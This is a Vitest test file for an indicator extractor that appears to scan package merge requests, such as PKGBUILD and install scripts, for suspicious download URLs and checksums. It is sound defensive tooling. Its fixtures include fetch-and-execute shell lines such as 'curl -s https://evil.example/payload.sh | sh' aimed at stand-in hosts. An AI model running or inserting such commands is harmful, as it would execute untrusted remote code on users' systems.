import { describe, expect, it } from 'vitest';
import { extractIndicators, MAX_INDICATORS_PER_MR } from './indicators';
import { addedOnlyDiff, makeChange } from './rules/test-support';

describe('extractIndicators', () => {
  it('extracts non-reputable URLs from added lines with their location', () => {
    const change = makeChange(addedOnlyDiff(['curl -s https://evil.example/payload.sh | sh']), {
      new_path: 'foo/foo.install',
    });
    expect(extractIndicators([change])).toEqual([
      { type: 'url', value: 'https://evil.example/payload.sh', context: 'foo/foo.install:1' },
    ]);
  });

  it('strips shell punctuation that trails a URL', () => {
    const change = makeChange(addedOnlyDiff(['sh <(curl -s https://evil.example/x),']), {
      new_path: 'foo/foo.install',
    });
    expect(extractIndicators([change])).toEqual([
      { type: 'url', value: 'https://evil.example/x', context: 'foo/foo.install:1' },
    ]);
  });

  it('skips reputable hosts, private hosts and non-http URLs', () => {
    const change = makeChange(
      addedOnlyDiff([
        'curl -s https://github.com/example/repo/install.sh | sh',
        'curl http://192.168.0.1/payload',
        'echo ftp://evil.example/x',
        'source=("http://127.0.0.1:8080/x")',
      ]),
    );
    expect(extractIndicators([change])).toEqual([]);
  });

  it('extracts source URLs and their sha256 checksums from PKGBUILDs', () => {
    const hash = 'a'.repeat(64);
    const change = makeChange(
      [
        '@@ -10,7 +10,9 @@',
        ' url="https://example.org/"',
        ' source=(',
        '+  "https://cdn.example.netlify.app/payload"',
        '+  "https://github.com/upstream/project.tar.gz"',
        ' )',
        ` sha256sums=('${hash}' 'b2short')`,
      ].join('\n'),
    );
    expect(extractIndicators([change])).toEqual([
      { type: 'url', value: 'https://cdn.example.netlify.app/payload', context: 'testpkg/PKGBUILD (source)' },
      { type: 'file', value: hash, context: 'testpkg/PKGBUILD (source checksum)' },
    ]);
  });

  it('skips VCS sources and files without a sha256 checksum', () => {
    const change = makeChange(
      [
        '@@ -10,7 +10,9 @@',
        ' source=(',
        '+  "git+https://git.somewhere-odd.example/payload.git"',
        '+  "https://evil.example/tarball.tar.xz"',
        ' )',
        " sha512sums=('SKIP' 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')",
      ].join('\n'),
    );
    expect(extractIndicators([change])).toEqual([
      { type: 'url', value: 'https://evil.example/tarball.tar.xz', context: 'testpkg/PKGBUILD (source)' },
    ]);
  });

  it('skips .git sources pinned by a fragment or query string', () => {
    const change = makeChange(
      [
        '@@ -10,7 +10,9 @@',
        ' source=(',
        '   "https://code.ffmpeg.org/FFmpeg/FFmpeg.git#tag=bf1b838f"',
        '   "https://evil.example/repo.git?ref=main"',
        ' )',
      ].join('\n'),
    );
    expect(extractIndicators([change])).toEqual([]);
  });

  it('dedupes URLs seen in several files, keeping the first context', () => {
    const first = makeChange(addedOnlyDiff(['curl -s https://evil.example/x']), { new_path: 'foo/a.sh' });
    const second = makeChange(addedOnlyDiff(['wget https://evil.example/x']), { new_path: 'foo/b.sh' });
    expect(extractIndicators([first, second])).toEqual([
      { type: 'url', value: 'https://evil.example/x', context: 'foo/a.sh:1' },
    ]);
  });

  it('caps the number of indicators per merge request', () => {
    const lines = Array.from(
      { length: MAX_INDICATORS_PER_MR + 10 },
      (unused, index) => `curl https://host${index}.example/x`,
    );
    const change = makeChange(addedOnlyDiff(lines), { new_path: 'foo/foo.install' });
    expect(extractIndicators([change])).toHaveLength(MAX_INDICATORS_PER_MR);
  });

  it('ignores deleted files and documentation', () => {
    const deleted = makeChange(addedOnlyDiff(['curl https://evil.example/x']), { deleted_file: true });
    const docs = makeChange(addedOnlyDiff(['curl https://evil.example/x']), { new_path: 'foo/README.md' });
    expect(extractIndicators([deleted, docs])).toEqual([]);
  });

  it('expands PKGBUILD variables in source URLs before scanning', () => {
    const change = makeChange(
      [
        '@@ -1,7 +1,9 @@',
        ' pkgname=foo',
        ' pkgver=1.2.3',
        ' source=(',
        '   "https://dl.example.net/$pkgname-$pkgver.tar.gz"',
        ' )',
      ].join('\n'),
    );
    expect(extractIndicators([change])).toEqual([
      { type: 'url', value: 'https://dl.example.net/foo-1.2.3.tar.gz', context: 'testpkg/PKGBUILD (source)' },
    ]);
  });

  it('skips source URLs with unresolved PKGBUILD variables', () => {
    const change = makeChange(
      ['@@ -1,5 +1,6 @@', ' source=(', '   "https://dl.example.net/${_missing}/$pkgver/x.tar.gz"', ' )'].join('\n'),
    );
    expect(extractIndicators([change])).toEqual([]);
  });

  it('skips documentation and landing pages to avoid false positives', () => {
    const change = makeChange(
      [
        '@@ -1,9 +1,10 @@',
        ' source=(',
        '   "https://cdn.example.net/terms"',
        '   "https://cdn.example.net/licenses"',
        '   "https://cdn.example.net/"',
        '   "https://cdn.example.net/help.html"',
        '   "https://cdn.example.net/app.tar.gz"',
        ' )',
      ].join('\n'),
    );
    expect(extractIndicators([change])).toEqual([
      { type: 'url', value: 'https://cdn.example.net/app.tar.gz', context: 'testpkg/PKGBUILD (source)' },
    ]);
  });
});
